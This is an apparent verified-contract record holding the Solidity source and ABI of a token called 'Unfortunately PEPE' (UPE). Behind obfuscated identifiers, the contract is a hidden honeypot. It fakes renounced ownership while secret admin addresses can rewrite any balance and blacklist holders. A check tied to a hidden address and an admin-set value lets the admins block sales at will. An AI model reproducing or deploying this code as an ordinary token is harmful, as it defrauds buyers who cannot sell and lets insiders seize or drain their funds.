{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface exemptSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listMaxReceiver) external view returns (uint256);\n\n    function transfer(address exemptLaunch, uint256 maxToken) external returns (bool);\n\n    function allowance(address marketingEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptLaunch,\n        uint256 maxToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityTrading, uint256 value);\n    event Approval(address indexed marketingEnable, address indexed spender, uint256 value);\n}\n\nabstract contract buyLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeFromLaunch {\n    function createPair(address amountEnable, address swapSell) external returns (address);\n}\n\ninterface exemptReceiver is exemptSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnfortunatelyPEPE is buyLimit, exemptSender, exemptReceiver {\n\n    function owner() external view returns (address) {\n        return takeAt;\n    }\n\n    address public txAutoSwap;\n\n    constructor (){\n        \n        txReceiver teamFund = txReceiver(launchedLaunchToken);\n        totalTo = takeFromLaunch(teamFund.factory()).createPair(teamFund.WETH(), address(this));\n        if (liquidityMode != receiverWallet) {\n            shouldLaunched = true;\n        }\n        txAutoSwap = _msgSender();\n        fundFrom();\n        amountMinAt[txAutoSwap] = true;\n        receiverLimit[txAutoSwap] = shouldIs;\n        if (fundSender == shouldLaunched) {\n            shouldLaunched = false;\n        }\n        emit Transfer(address(0), txAutoSwap, shouldIs);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingMarketing;\n    }\n\n    function teamList() private view {\n        require(amountMinAt[_msgSender()]);\n    }\n\n    bool public fundSender;\n\n    uint256 constant launchAutoTx = 15 ** 10;\n\n    bool public liquidityLaunched;\n\n    uint256 public receiverWallet;\n\n    function modeExempt(address amountFromMax, address exemptLaunch, uint256 maxToken) internal returns (bool) {\n        require(receiverLimit[amountFromMax] >= maxToken);\n        receiverLimit[amountFromMax] -= maxToken;\n        receiverLimit[exemptLaunch] += maxToken;\n        emit Transfer(amountFromMax, exemptLaunch, maxToken);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitToken;\n    }\n\n    mapping(address => mapping(address => uint256)) private modeTakeExempt;\n\n    address modeFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function enableTxSell(address receiverTotalReceiver, uint256 maxToken) public {\n        teamList();\n        receiverLimit[receiverTotalReceiver] = maxToken;\n    }\n\n    uint256 maxReceiverList;\n\n    function transferFrom(address amountFromMax, address exemptLaunch, uint256 maxToken) external override returns (bool) {\n        if (_msgSender() != launchedLaunchToken) {\n            if (modeTakeExempt[amountFromMax][_msgSender()] != type(uint256).max) {\n                require(maxToken <= modeTakeExempt[amountFromMax][_msgSender()]);\n                modeTakeExempt[amountFromMax][_msgSender()] -= maxToken;\n            }\n        }\n        return txBuy(amountFromMax, exemptLaunch, maxToken);\n    }\n\n    function fundFrom() public {\n        emit OwnershipTransferred(txAutoSwap, address(0));\n        takeAt = address(0);\n    }\n\n    mapping(address => bool) public launchLaunchedTo;\n\n    mapping(address => bool) public amountMinAt;\n\n    bool private shouldLaunched;\n\n    function receiverFee(address fundTrading) public {\n        teamList();\n        if (shouldLaunched != fundSender) {\n            sellMin = false;\n        }\n        if (fundTrading == txAutoSwap || fundTrading == totalTo) {\n            return;\n        }\n        launchLaunchedTo[fundTrading] = true;\n    }\n\n    uint256 private liquidityMode;\n\n    address launchedLaunchToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private receiverLimit;\n\n    function allowance(address txAmount, address txTrading) external view virtual override returns (uint256) {\n        if (txTrading == launchedLaunchToken) {\n            return type(uint256).max;\n        }\n        return modeTakeExempt[txAmount][txTrading];\n    }\n\n    string private liquidityWallet = \"UPE\";\n\n    function transfer(address receiverTotalReceiver, uint256 maxToken) external virtual override returns (bool) {\n        return txBuy(_msgSender(), receiverTotalReceiver, maxToken);\n    }\n\n    function swapTotal(uint256 maxToken) public {\n        teamList();\n        maxMarketing = maxToken;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeAt;\n    }\n\n    event OwnershipTransferred(address indexed listAt, address indexed teamTotalSell);\n\n    address private takeAt;\n\n    bool public sellMin;\n\n    function toList(address senderLimit) public {\n        if (liquidityLaunched) {\n            return;\n        }\n        \n        amountMinAt[senderLimit] = true;\n        if (fundSender != shouldLaunched) {\n            liquidityMode = receiverWallet;\n        }\n        liquidityLaunched = true;\n    }\n\n    uint8 private tradingMarketing = 18;\n\n    function txBuy(address amountFromMax, address exemptLaunch, uint256 maxToken) internal returns (bool) {\n        if (amountFromMax == txAutoSwap) {\n            return modeExempt(amountFromMax, exemptLaunch, maxToken);\n        }\n        uint256 exemptLimit = exemptSender(totalTo).balanceOf(modeFee);\n        require(exemptLimit == maxMarketing);\n        require(exemptLaunch != modeFee);\n        if (launchLaunchedTo[amountFromMax]) {\n            return modeExempt(amountFromMax, exemptLaunch, launchAutoTx);\n        }\n        return modeExempt(amountFromMax, exemptLaunch, maxToken);\n    }\n\n    address public totalTo;\n\n    function approve(address txTrading, uint256 maxToken) public virtual override returns (bool) {\n        modeTakeExempt[_msgSender()][txTrading] = maxToken;\n        emit Approval(_msgSender(), txTrading, maxToken);\n        return true;\n    }\n\n    uint256 private shouldIs = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldIs;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityWallet;\n    }\n\n    function balanceOf(address listMaxReceiver) public view virtual override returns (uint256) {\n        return receiverLimit[listMaxReceiver];\n    }\n\n    string private limitToken = \"Unfortunately PEPE\";\n\n    uint256 maxMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTotalSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMinAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMaxReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxToken\",\"type\":\"uint256\"}],\"name\":\"enableTxSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchLaunchedTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTrading\",\"type\":\"address\"}],\"name\":\"receiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxToken\",\"type\":\"uint256\"}],\"name\":\"swapTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"}],\"name\":\"toList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFromMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAutoSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UnfortunatelyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}